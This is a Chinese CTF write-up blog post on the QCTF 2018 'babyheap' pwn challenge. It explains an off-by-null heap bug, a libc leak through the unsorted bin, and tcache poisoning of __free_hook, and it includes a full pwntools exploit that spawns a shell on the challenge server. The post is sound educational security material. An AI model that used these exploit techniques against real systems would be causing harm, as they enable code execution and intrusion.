<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>XCTF/BUU-4th-QCTF-2018-babyheap-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一"><meta property="og:image" content><meta property="og:title" content=" XCTF/BUU-4th-QCTF-2018-babyheap-WP"><meta property="og:description" content="3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1144.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-05T14:25:00+00:00"><meta property="article:modified_time" content="2021-03-05T14:25:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content=" XCTF/BUU-4th-QCTF-2018-babyheap-WP"><meta name=twitter:description content="3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF/BUU-4th-QCTF-2018-babyheap-WP</h1><div class=meta>Posted on Mar 5, 2021</div></div><section class=body><p><em>3.04</em></p><p>这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一下，今天 leak 出了 libc_base，但是比较晚了，明天还有早八，所以先不搞了。</p><hr><p><em>3.05</em></p><p>今天突然想到上 buu 看一下有没有环境，发现还真的有。buu 还是很讲理的，libc 都会提供，而且本题的比赛环境是 2.27，buu 和其一致，xctf 上则是 2.23 版本的。2.27 会简单不少，不需要使用地址错位，并且可以分配到 <code>__free_hook</code> 上写 <code>system</code> 的地址，大大增加了打通的可能性。这里先写一下针对 buu 的题解，之后可能会补一下 2.23 的利用方法，但是 xctf 上的远程基本是没法打了，痛失八分有些难受。</p><h3 id=227buu利用方法>2.27（buu）利用方法</h3><p>漏洞点在 <code>read_input</code> 函数中</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2914800294.png></div><p>结尾处有一个 <code>off by null</code> 的漏洞。</p><p>同时本题提供了一个输出的函数</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/894780067.png></div><p>所以不难想到可以通过 leak <code>Unsorted Bin</code> 链表尾的 <code>chunk</code> 的 <code>fd</code> 的指针来获得 libc 基地址。（这个方法这里不详细说原理了，可以看我的<a href=https://www.cjovi.icu/pwnreview/1089.html>这篇文章</a>。）</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/1595158311.png></div><p>注意到 <code>delete</code> 的时候对指针置零了，无法直接 <code>UAF</code>。考虑申请 A，B 两个 chunk，利用 <code>off by null</code> 的漏洞来将 B 的 <code>prev_inuse</code> 位置零，这样在 <code>free(B)</code> 的时候就会前向合并，合并之后的 chunk 如果大小合适就会进入 <code>Unsorted Bin</code>中。</p><p>但是这个时候碰到了一个问题，前向合并的时候会对 A 进行<code>unlink</code>，但是程序开启了 PIE，我们难以伪造，也就是说如果不把 A 提前 <code>free</code> 掉，是不能 <code>free(B)</code> 的，但是如果提前 <code>free</code> 了 A，我们又没办法实现 leak 了。</p><p>解决这个矛盾的办法是在 A B 间再申请一个 chunk C，这样可以把 A 提前 <code>free</code> 掉，而我们仍然可以有一个能够访问已被 <code>free</code> 掉的 chunk 的指针，当然这个指针指向的是 chunk 的中段而不是开头，还是无法 leak，但是这不碍事，我们只要再申请一个和 A 大小一样的 chunk，C 指向的 chunk 就会被分割，C 指向的就正好是一个 <code>Unsorted Bin</code> 的 <code>fd</code> 指针啦！这样就实现了 leak。当然，为了防止 A 和 C 被合并，可以在两者直接放一个 chunk D 来隔开二者（为了之后的利用，这个 chunk 的大小需要能够进入 <code>Tcache</code>），再次申请时，申请的大小为 A 和 D 的大小之和。还有一点要注意，A 的大小要属于 <code>Unsorted Bin</code>，这样才能被成功 <code>unlink</code>。</p><p>也就是这样一个结构</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/450469249.jpg></div><p>实现的代码：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Create(0x4F0,&#39;index:0\n&#39;)
</span></span><span style=display:flex><span>Create(0xF0,&#39;index:1\n&#39;)
</span></span><span style=display:flex><span>Create(0x5F8,&#39;index:2\n&#39;)
</span></span><span style=display:flex><span>Create(0x4F0,&#39;index:3\n&#39;)
</span></span><span style=display:flex><span>Create(0x20,&#39;index:4\n&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Delete(2)
</span></span><span style=display:flex><span>Delete(0)
</span></span><span style=display:flex><span>Create(0x5F8,&#39;a&#39; * 0x5F0 + p64(0xC00))#index:2
</span></span><span style=display:flex><span>Delete(3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Create(0x5F0,&#34;index:2\n&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Show()
</span></span></code></pre></div><p>leak 的问题解决了，之后就是要实现任意地址写，这里可以使用 <code>Tcache poisoning</code> 很容易地分配到 <code>__free_hook</code> 上面。要实现 <code>Tcache poisoning</code>，需要能够对一个 <code>Tcache</code> 的 <code>next</code> 指针实现写的能力。事实上我们在实现 leak 时，再次申请的大小为 A 和 D 的大小之和的 chunk（记这个 chunk 为 E）就可以做到这一点。所以我们只要先 <code>free</code> 掉 chunk D，然后 <code>free</code> 掉 E，在把 E 申请回来就可以控制 D 的 <code>next</code> 了，就可以顺利分配到 <code>__free_hook</code> 上了，然后把 <code>system</code> 写进去，再 <code>free</code> 一个写有 <code>"/bin/sh\x00"</code> 的 chunk 就可以 getshell 了。</p><h4 id=exp>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Create</span>(size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size:&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Data:&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Show</span>():
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice :</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./timu&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node3.buuoj.cn&#34;</span>,<span style=color:#40a070>28336</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./buu-libc-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x4F0</span>,<span style=color:#4070a0>&#39;index:0</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0xF0</span>,<span style=color:#4070a0>&#39;index:1</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x5F8</span>,<span style=color:#4070a0>&#39;index:2</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x4F0</span>,<span style=color:#4070a0>&#39;index:3</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;index:4</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x5F8</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x5F0</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0xC00</span>))<span style=color:#60a0b0;font-style:italic>#index:2</span>
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x5F0</span>,<span style=color:#4070a0>&#34;index:2</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Show()
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;0 : &#34;</span>)
</span></span><span style=display:flex><span>main_arena <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;main_arena:&#34;</span> <span style=color:#666>+</span> hex(main_arena))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> main_arena <span style=color:#666>-</span> <span style=color:#40a070>0x3EBC40</span>
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> hex(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>alloc_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x3c565</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Show()
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0x5F8</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x4F0</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x101</span>) <span style=color:#666>+</span> p64(alloc_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0xF0</span>,<span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00\n</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
</span></span><span style=display:flex><span>Create(<span style=color:#40a070>0xF0</span>,p64(system_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#alloc to free</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>Delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>